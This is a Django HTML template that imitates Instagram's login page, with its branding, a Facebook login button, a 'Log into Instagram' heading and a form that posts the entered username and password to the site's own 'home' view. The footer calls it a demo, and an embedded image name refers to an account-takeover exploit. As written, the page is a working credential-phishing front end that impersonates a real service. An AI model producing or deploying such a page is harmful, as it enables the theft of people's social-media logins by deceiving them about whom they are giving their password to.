<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
  :root{
    --bg: #000000;
    --panel-border: #262626;
    --input-bg: #000000;
    --input-border: #262626;
    --text-primary: #fafafa;
    --text-muted: #a8a8a8;
    --accent-blue: #0a3a6e;
    --accent-blue-text: #4a9eff;
    --link-pink: #ff5fa0;
  }

  *{ box-sizing: border-box; }

  html, body{
    margin:0;
    padding:0;
    background: var(--bg);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: var(--text-primary);
    min-height: 100vh;
  }

  .page{
    display:flex;
    align-items:center;
    justify-content:center;
    min-height: 100vh;
    padding: 40px 20px;
  }

  .layout{
    display:flex;
    align-items:center;
    justify-content:center;
    gap: 90px;
    max-width: 1000px;
    width:100%;
  }

  /* ---------- LEFT: phone illustration + headline ---------- */
  .left{
    flex: 1 1 480px;
    display:flex;
    flex-direction:column;
    align-items:flex-start;
    gap: 28px;
    min-width: 0;
  }

  .brandmark{
    width: 64px;
    height: 64px;
    border-radius: 16px;
    background: conic-gradient(from 220deg, #ffd76e, #ff7a3d, #ff3d77, #c93dff, #6a5bff);
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .brandmark svg{ width: 34px; height: 34px; }

  .headline{
    font-size: 42px;
    line-height: 1.25;
    font-weight: 600;
    color: var(--text-primary);
    max-width: 460px;
    margin: 0;
  }
  .headline .accent{
    background: linear-gradient(90deg, #ff7a3d, #ff3d77, #c93dff);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }

  .illustration{
    position: relative;
    width: 460px;
    max-width: 100%;
    height: 360px;
  }

  .card{
    position:absolute;
    width: 190px;
    height: 320px;
    border-radius: 22px;
    background: linear-gradient(160deg, #2b2330, #15121a);
    border: 1px solid #3a3140;
    box-shadow: 0 30px 60px -20px rgba(0,0,0,0.6);
    overflow:hidden;
  }
  .card.back{
    left: 10px;
    top: 30px;
    transform: rotate(-8deg);
    opacity: 0.7;
  }
  .card.front{
    left: 140px;
    top: 0;
    transform: rotate(4deg);
  }
  .card .photo{
    position:absolute;
    inset: 0;
    background: linear-gradient(135deg, #f3c969 0%, #e8915a 35%, #6b4a8a 70%, #2f3e6b 100%);
  }
  .card .progress{
    position:absolute;
    top: 14px;
    left: 14px;
    right: 14px;
    height: 3px;
    border-radius: 3px;
    background: rgba(255,255,255,0.25);
    overflow:hidden;
  }
  .card .progress::after{
    content:"";
    position:absolute;
    left:0; top:0; bottom:0;
    width: 55%;
    background: #fff;
    border-radius: 3px;
  }
  .card .heart-icon, .card .bubble{
    position:absolute;
    width: 30px; height:30px;
    border-radius: 50%;
    background: #1a1a1a;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size: 14px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.4);
  }
  .floating-heart{
    position:absolute;
    left: 4px;
    bottom: 90px;
    width: 46px;
    height: 46px;
    border-radius: 50%;
    background: linear-gradient(135deg, #ff5fa0, #ff8a3d);
    display:flex;
    align-items:center;
    justify-content:center;
    box-shadow: 0 8px 20px rgba(255,80,140,0.45);
    z-index:3;
  }
  .floating-heart svg{ width:22px; height:22px; fill:#fff; }

  .star-badge{
    position:absolute;
    right: -14px;
    top: 96px;
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background: #2ecc71;
    display:flex;
    align-items:center;
    justify-content:center;
    box-shadow: 0 6px 14px rgba(46,204,113,0.4);
    z-index:3;
    color:#fff;
    font-size: 16px;
  }

  .ring-avatar{
    position:absolute;
    right: -22px;
    bottom: 56px;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    padding: 3px;
    background: linear-gradient(135deg, #ff3d77, #c93dff);
    z-index:3;
  }
  .ring-avatar .inner{
    width:100%;
    height:100%;
    border-radius:50%;
    background: linear-gradient(160deg,#7c5a3a,#3a2f24);
    border: 2px solid #000;
  }

  .bottom-icon-row{
    position:absolute;
    bottom: 14px;
    width: 100%;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding: 0 14px;
  }
  .pill{
    width: 60%;
    height: 6px;
    border-radius: 4px;
    background: rgba(255,255,255,0.5);
  }
  .heart-outline{
    width: 22px; height: 22px;
    color: #fff;
  }

  /* ---------- RIGHT: login form ---------- */
  .right{
    flex: 0 0 380px;
    display:flex;
    flex-direction:column;
    gap: 22px;
  }

  .right h1{
    font-size: 24px;
    font-weight: 600;
    margin: 0;
  }

  form{
    display:flex;
    flex-direction:column;
    gap: 14px;
  }

  .field{
    width:100%;
    padding: 16px 16px;
    border-radius: 10px;
    border: 1px solid var(--input-border);
    background: var(--input-bg);
    color: var(--text-primary);
    font-size: 15px;
    outline: none;
    transition: border-color .15s ease;
  }
  .field::placeholder{ color: var(--text-muted); }
  .field:focus{ border-color:#6b6b6b; }

  .btn-primary{
    margin-top: 4px;
    width: 100%;
    padding: 14px 16px;
    border: none;
    border-radius: 10px;
    background: var(--accent-blue);
    color: var(--accent-blue-text);
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: filter .15s ease;
  }
  .btn-primary:hover{ filter: brightness(1.15); }

  .forgot-link{
    align-self:center;
    color: #e8e8e8;
    font-size: 14px;
    text-decoration: none;
    margin-top: 4px;
  }
  .forgot-link:hover{ text-decoration: underline; }

  .divider{
    margin-top: 6px;
  }

  .btn-secondary{
    width:100%;
    padding: 12px 16px;
    border-radius: 10px;
    border: 1px solid var(--input-border);
    background: transparent;
    color: var(--text-primary);
    font-size: 14px;
    font-weight: 500;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap: 8px;
  }
  .btn-secondary:hover{ background: #111; }
  .btn-secondary svg{ width:16px; height:16px; }

  .btn-outline{
    width:100%;
    padding: 12px 16px;
    border-radius: 10px;
    border: 1px solid #2d6cdf;
    background: transparent;
    color: #4a9eff;
    font-size: 14px;
    font-weight: 600;
    cursor:pointer;
  }
  .btn-outline:hover{ background: rgba(74,158,255,0.08); }

  footer{
    margin-top: 30px;
    text-align:center;
    color: var(--text-muted);
    font-size: 13px;
  }
  footer .links{
    display:flex;
    flex-wrap:wrap;
    justify-content:center;
    gap: 16px;
    margin-bottom: 14px;
  }
  footer a{
    color: var(--text-muted);
    text-decoration:none;
  }
  footer a:hover{ text-decoration:underline; }
  footer .copyright{ font-size: 12px; }

  @media (max-width: 900px){
    .layout{
      flex-direction: column;
      gap: 50px;
    }
    .left{ align-items:center; text-align:center; }
    .headline{ font-size: 34px; }
    .right{ flex-basis: auto; width: 100%; max-width: 380px; }
  }
</style>
</head>
<body>

<div class="page">
  <div class="layout">

    <!-- LEFT SIDE -->
    <div class="left">
      <div class="brandmark" aria-hidden="true">
        <img src="https://i.redd.it/9xouuqyk8f091.jpg" alt="fcf" style="width:100px;height:100px">
      </div>

      <h2 class="headline">
        See everyday moments from your  <span class="accent">close friends.</span>
      </h2>

      <div class="illustration">
            <img src="https://images.hothardware.com/contentimages/newsitem/70777/content/1x1_1200x1200_highres-meta-ai-chatbot-exploit-account-takeover-news.jpg" alt="hh" style="width:400px;height:400px">

      </div>
    </div>
    <!-- RIGHT SIDE: LOGIN FORM -->
    <div class="right">
      <h1>Log into Instagram</h1>

      <form method="post" action="{% url 'home' %}">
      {% csrf_token %}
      <input name="username" class="field" type="text" placeholder="Mobile number, username or email" autocomplete="username" required>
      <input name="password" class="field" type="password" placeholder="Password" autocomplete="current-password" required>
      <button class="btn-primary" type="submit">Log in</button>
    </form>

      <a href="#" class="forgot-link">Forgot password?</a>

      <div class="divider">
        <button class="btn-secondary" type="button">
          <svg viewBox="0 0 24 24" fill="#1877f2"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.5.3v2.7h-1.7c-1.3 0-1.7.8-1.7 1.7V12h2.9l-.5 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg>
          Log in with Facebook
        </button>
      </div>

      <button class="btn-outline" type="submit" style="margin-top:6px;">Create new account</button>


    </div>

  </div>
</div>

<footer>
  <div class="links">
    <a href="#">About</a>
    <a href="#">Help</a>
    <a href="#">API</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Locations</a>
  </div>
  <div class="copyright">&copy; 2026 Demo Login Page</div>
</footer>

</body>
</html>
